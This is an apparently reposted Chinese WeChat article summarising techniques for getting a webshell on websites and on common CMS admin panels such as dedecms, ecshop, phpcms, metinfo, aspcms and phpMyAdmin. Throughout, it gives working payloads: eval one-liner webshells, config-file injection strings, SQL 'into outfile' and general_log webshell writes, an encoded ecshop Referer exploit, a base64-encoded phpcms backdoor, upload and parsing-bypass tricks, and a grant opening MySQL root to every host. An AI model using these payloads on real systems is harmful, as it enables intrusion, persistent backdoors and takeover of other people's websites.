\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/mrFdkPlxU50PJdq6goMHUQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/p5qELRDe5ick4ibX3c0lEhxZ3M49spga20NCDwb0OAXRLZfmzkLm4AeP7zPtlXW7iacXwbMiaFR3N8d8XvuibcxPLxg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**一、方法分类**  
**1.带有漏洞的应用**  
redis 、tomcat、解析漏洞、编辑器、FTP  
  
**2.常规漏洞**  
sql注入、上传、文件包含、命令执行、Struts2、代码反序列化  
  
**3.后台拿shell**  
上传、数据库备份、配置插马  
  
关于各种带有漏洞的应用以及OWASP Top10常规漏洞需要不断的积累，打造自己的核心知识库，道路且长。本文仅记录最近对常见cms后台getshell的学习总结  
  
**二、网站常见getshell方法**  
**1.数据库备份拿shell**  
如果网站后台具有数据库备份功能，可以将webshell格式先修改为允许上传的文件格式如jpg，gif等。然后找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。  
  
**2.上传**  
上传是拿shell最常见的方式，不区分web前后台，有上传的地方均需尝试上传。常见的上传绕过方法：  

*   本地js验证上传
    
*   服务器mime绕过
    
*   服务器文件头绕过
    
*   服务器 filepath上传
    
*   双文件上传
    
*   %00截断上传
    
*   上传其他脚本类型
    

3.修改允许上传类型  
进入网站后台后找到上传点发现对上传有白名单限制，正好又可以添加白名单，可以将脚本格式写入白名单然后进行上传。如果容器允许的情况下，尝试上传与网站源码不同类型的脚本格式拿shell

4.服务器解析漏洞

**IIS 5.x/6.0解析漏洞**  
    目录解析：x.asp/1.jpg  
     分号解析：x.asp;.jpg会被解析asp格式  
     其他文件名:cer,asa,cdx…  
**IIS 7.0/IIS 7.5/**  
     畸形文件名解析：test.jpg/\*.php  
**Nginx**  
     畸形解析漏洞 :test.jpg/\*.php(Nginx版本无关，只与配置环境有关)  
    <8.03空字节代码执行漏洞 :test.jpg%2500.php  
**Apache解析漏洞**  
    Apache解析文件时是按照从右向左的方式,test.php.aaa.sss,Apache无法解析.aaa.sss，向左解析到.php,于是test.php.aaa.sss就被解析为php文件

  

**5.编辑器**  
低版本的ewebeditor、fckeditor编辑器均有漏洞可以利用。或绕过上传或结合解析漏洞  
  
**6\. 网站配置插马**  
在网站后台的一些配置接口中最终的配置结果会写进网站配置文件，这里通过源码的过滤规则进行闭合语句可以直接将shell写进配置文件从而getshell。注意：网站后台配置插马属于高危操作，如果闭合失败网站将全面崩溃，不建议生产环境下操作。  
例：良精后台配置插马

```
`#配置文件路径：../inc/config.asp``#插马语句："%><%eval request("123")%><%'`
```

![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZOCCNyEdBgicOrIibpU82FIz8HHJDg6wJc2nS1hKURVATlvIb0FClgKnzswPdqLia9ez8WPwibrAFLTw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)  

http://192.168.1.10:8009//inc/config.asp  
![](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNZOCCNyEdBgicOrIibpU82FIzNZ0cibia6ay1WyIWGdtuduoG1xOF0jO7nRHTO6m6b8icEo2UiakHLHBgXA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)  

7.上传插件  
将shell添加到安装的插件中上传服务器拿shell。典型如wordpress

8.数据库执行  
通过数据库执行命令导出一句话到网站目录拿shell。此方法需要有数据库写入权限，且知道网站目录

sqlserver 导出  
SQL server 2005之后就不能导了，因为sp\_makewebtask存储过程被取消了  
  

```
;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%27<%execut
```

mysql导出  
  
版本一  

```
`Create TABLE study (cmd text NOT NULL);``Insert INTO study (cmd) VALUES('<?php eval ($_POST[cmd]) ?>');``select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';``Drop TABLE IF EXISTS study;`
```

版本二  

```
`use mysql;``create table x(packet text) type=MYISaM;``insert into x (packet) values('<pre><body ><?php @system($_GET["cmd"]); ?></body></pre>')``select x  into outfile 'd:\php\xx.php'`
```

版本三  

```
select '<?php eval($_POST[cmd]);?>' into outfile 'C:/Inetpub/wwwroot/mysql-php/1.php'
```

**9.文件包含**  
可绕过waf拿webshell。借助文件包含躲避waf拦截。一般用来上大马用  
asp 包含代码  

```
`<!--#include file="123.jpg"-->``#调用的文件必须和被调用文件在同一目录，如果不在同一目录，用下面的语句：``<!--#include  virtual="文件所在目录/123.jpg"-->`
```

php包含  

```
`<?php``include('123.jpg');``?>`
```

10\. 命令执行  

```
`echo ^<^?php @eval($_POST['cmd']);?^>^ > c:\1.php``^<^%eval request("cracer")%^>^ > c:\1.php``# 需要知道网站路径`
```

  

===

三、常见cms后台拿shell
===============

1.dedecms
---------

dedecms版本：http://192.168.1.10:8030/data/admin/ver.txt  
默认后台：http://192.168.1.10:8030/dede/

```
`# dedecms后台一般都被修改不好找，可借助google语法：``Powered byDedeCMSV57_GBK_SP2 site:xx.com`
```

一、后台文件上传  
进入后台：核心》附件管理》文件式管理器》可直接修改源码或者上传shell![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

写马  
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

连接![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

如果目标“文件式管理器”接口被阉割，也许只是单纯的在前端删除了入口。可以修改js调用：

```
`media_main.php?dopost=filemanager``#找到任意按钮修改js代码如图，即可再次调用文件管理`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

如果权限被限制无法上传到upload以外的目录。通过修改名称跨越目录，绕过权限封锁  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

二、数据库执行拿shell  

sql命令行工具》写shell  

```
`#需要得到网站的物理路径``select "<?php @eval($_POST[x]);?>" into outfile 'C:\\inetpub\\getshell\\DedecmsV53-UTF8-Final\\DedecmsV53-UTF8-Final\\x.php'``#dede暴路径方法``payload:http://xxx.com/plus/feedback.php?aid=1&dsql=xxx`
```

写shell  
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

连接![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2.南方数据、良精、动易
------------

一、数据库备份(备份图片马、备份数据库)  
系统管理》数据库备份页面经常被删除，需要修改js重新调用数据库备份页面

```
manage_backup.asp
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

1.上传图片马  
产品管理》添加产品》上传图片马

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2.审查元素，找到图片马路径  
如：http://192.168.1.10:8009/UploadFiles/1.jpg

3.开始备份

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

注意点：  
1.如果附加了asa无法访问，尝试删除asa访问。解析即可。  
2.如果出现文件头为database、jet db。表示实际备份的还是数据库，我们提交的图片马并没有备份到。这里尝试添加管理员将shell写进数据库。然后再备份即可。这如果长度有限制，可以在审查元素修改maxlength或者抓包  
3.如果数据库路径…/Databases/0791idc.mdb框无法修改。尝试审查元素或者burp改包  
4.备份目录不用管  

二、配置插马

三、修改上传类型突破上传

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

四、双文件突破上传

五、修改editor/admin\_style.asp

3.ecshop
--------

1.sql语句写shell

```
`#报错获取网站物理路径``use mysql;``#写shell``select "<?php phpinfo();?>" into outfile 'C:\\inetpub\\getshell\\8103-ECShop\\ECShop_2.7.4_UTF8_beta1\\upload\\x.php'`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2.修改文件  
库项目管理》配送方式

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

连接：http://192.168.1.10:8103/myship.php

3.前台getshell  
http://192.168.1.10:8103/user.php》刷新抓包》发送repeater：

```
`exp：``Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"'/*";}`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

会在网站根目录下生成1.php一句话木马，密码1337![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**3.5wordpress上传插件**  
安装插件》上传插件》插件马(正常插件+大马压缩包)》上传成功  

```
`#插件马位置：``./wp-content/plugins/alipay-donate/webshell.php`
```

  

**4.phpmyadmin写shell**  
phpmyadmin 常见路径：phpmyadmin、pma、pmd、pm、phpmyadmin+版本号。或者端口号搭建888/999/8888/777。可尝试爆破登录：  
  

```
`#写shell语句``select '<?php eval($_POST[cmd]);?>' into outfile 'D:\SOFT\webbuild\php\WWW\aa.php'`
```

寻找网站根目录  
1.找mysql安装目录

```
select @@basedir;  

```

2.根据mysql安装路径推理出apache配置文件（记录了网站根目录）

```
./apache/conf/https.conf  

```

3.使用某个数据库，创建一个表用来读取apache的配置文件  

```
`use mysql;``create table xx(xx text);``load data infile "D:\SOFT\webbuild\php\Apache/conf/https.conf" into table xx;``select * from xx;``# 在搜索结果里面检索关键词documentroot找到网站根目录`
```

**如果有waf会拦截不让导shell**  
1.找免杀马  
2.开启外联  

```
`#开外链。将mysql root放在所有地址上并设置密码``Grant all privileges on *.* to 'root'@'%' identified by '123.com' with grant option;``#公网地址链接目标mysql服务器``mysql.exe -h 200.1.1.1 -uroot -p`
```

3.通过远程地址链接mysql服务器导入一句话  
  
**如果导出函数into outfile 被禁用**  
1.生成日志getshell  
genaeral log设置为on，备份genaeral log file路径后修改为我们要导的shell路径。然后执行带有一句话的sql语句写入日志文件，成功getshell。完成后记得还原genaeral log file路径

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

备份路径：genaeral log file：D:\\SOFT\\webbuild\\php\\MySQL\\data\\DESKTOP-CCDQEGR.log

执行：select “<?php phpinfo();?>”

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

写入成功：http://localhost/xxx.php  

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

```
`#命令行操作：``set global general_log=on;``set global general_log_file='shell路径';``#还原``set global general_log=off;``set global general_log_file='D:\SOFT\webbuild\php\MySQL\data\DESKTOP-CCDQEGR.log';`
```

  

---

5.kesion cms
------------

科迅cms需要使用ie低版本浏览器  
一、添加上传类型

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

这里会回显文件名不合法。但是实际上已经上传成功（新版本失败）

6.aspcms
--------

1.插件管理，界面风格修改asp文件

2.扩展功能，数据库备份

3.配置插马  
幻灯片设置

```
`#插马路径``./config/aspcms_config.asp``#语句``%><%Eval(Request(chr(112)))%><%`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

**7.SD cms**  
1.上传设置，添加脚本类型（大小写替换）  
2.界面，模板管理，点击sdcms\_index.asp，插入一句话到首页  
  
**8.phpcms**  
1.界面，模板风格，详情列表，修改脚本格式文件  
  
2.phpsso(没有这个界面的话调用js），系统设置，ucenter设置，插马  

```
`#插马位置``./phpsso_server/caches/configs/uc_config.php``#先闭合表单``name="data[uc_api','11');/*]``# 再插入代码``*/@eval($_REQUEST[TEST]);//`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

连接：![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

3.内容，专题，添加专题  

```
<?php file_put_contents('0.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOz8+'));?>  
#在根目录下生成0.php，密码cmd  

```

添加专题1

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

添加专题2

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扩展设置，专题模板。value值设置为：

```
../../../../html/special/test000/index  

```

提交，提交完成后会在根目录生成0.php后门文件

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**9.metinfo**  
1.安装插件getshell  
  
2.安全》备份与恢复》数据库备份》下载》打开sql文件》合适的地方输入语句：  

```
select "<?php @eval($_POST[cmd]);>" into oufile 'c:/inetpub/wwwroot/8121/xx.php';
```

《重新压缩》删除之前备份文件》上传修改之后的数据库备份文件》导入：执行sql语句》生成shell  
  
3.<6.0,直接访问：  

```
192.168.1.10:8095/admin/column/save.php?name=123&action=editor&foldername=upload&module=22;@eval($_POST[cmd]);/*
```

在upload目录下生成index.php的一句话：  
连接：192.168.1.10/upload/index.php

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**10.discuz**  
管理后台：admin.php  
创始人管理后台：uc\_server/admin.php  
管理后台：  
1.站长，uccenter设置，插马，待复现。参考：  
https://paper.seebug.org/1144/#2-ucketdz  
  
**11.帝国cms**  
1.系统》数据表与系统模型》管理数据表》管理系统模型》导入系统模型》上传1.php.mod》会在当前目录下生成一句话co.php：  
连接：http://192.168.1.10:8111/e/admin/co.php  
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

2.帝国备份王getshell

12.phpmywind
------------

1.网站信息设置》附件设置，添加允许上传类型getshell  
2.网站信息设置》增加新变量  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

》提交》基本设置：1;@eval($\_POST\[a\])![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

》提交>连接：http://192.168.1.10:8112/admin/default.php  
新版本过滤分号无法连接：慎重插马

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

13.phpweb
---------

1.前台直接上传  
https://blog.csdn.net/weixin\_44508748/article/details/105671332

2.后台编辑器  
产品》修改》

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)连接：

http://192.168.1.12/phpweb/3151/product/pics/20200628/202006281593274850595.php![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

\-----------------------------------------------------------------------------------

  

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**【好书推荐】**

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

[2020hw系列文章整理（中秋快乐、国庆快乐、双节快乐）](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=1&sn=c84692daf6077f5cc7c348d1e5b3a349&chksm=f9e38c6ece9405785260b092d04cfb56fec279178d4efcd34bf8121b89a28885bf20568cdfda&scene=21#wechat_redirect)  

[HW中如何检测和阻止DNS隧道](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=2&sn=7afccd524c176b4912526d8f5d58dc3a&chksm=f9e38c6ece940578b5a4f0f102fa5a20b6facee51f23e3fa25598e9e7257c798180edcdf5802&scene=21#wechat_redirect)

[ctf系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=1&sn=40df204276e9d77f5447a0e2502aebe3&chksm=f9e3877bce940e6d0e26688a59672706f324dedf0834fb43c76cffca063f5131f87716987260&scene=21#wechat_redirect)

[日志安全系列-安全日志](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=1&sn=984043006a1f65484f274eed11d8968e&chksm=f9e386b1ce940fa79b578c32ebf02e69558bcb932d4dc39c81f4cf6399617a95fc1ccf52263c&scene=21#wechat_redirect)

[【干货】流量分析系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494242&idx=1&sn=7f102d4db8cb4dddb5672713803dc000&chksm=f9e38539ce940c2f488637f312fb56fd2d13a3dd57a3a938cd6d6a68ebaf8806b37acd1ce5d0&scene=21#wechat_redirect)

[【干货】超全的 渗透测试系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494408&idx=1&sn=75b61410ecc5103edc0b0b887fd131a4&chksm=f9e38453ce940d450dc10b69c86442c01a4cd0210ba49f14468b3d4bcb9d634777854374457c&scene=21#wechat_redirect)

[【干货】持续性更新-内网渗透测试系列文章](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494623&idx=1&sn=f52145509aa1a6d941c5d9c42d88328c&chksm=f9e38484ce940d920d8a6b24d543da7dd405d75291b574bf34ca43091827262804bbef564603&scene=21#wechat_redirect)  

[【干货】android安全系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494707&idx=1&sn=5b2596d41bda019fcb15bbfcce517621&chksm=f9e38368ce940a7e95946b0221d40d3c62eeae515437c040afd144ed9d499dcf9cc67f2874fe&scene=21#wechat_redirect)

  

* * *

****扫描关注LemonSec****  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)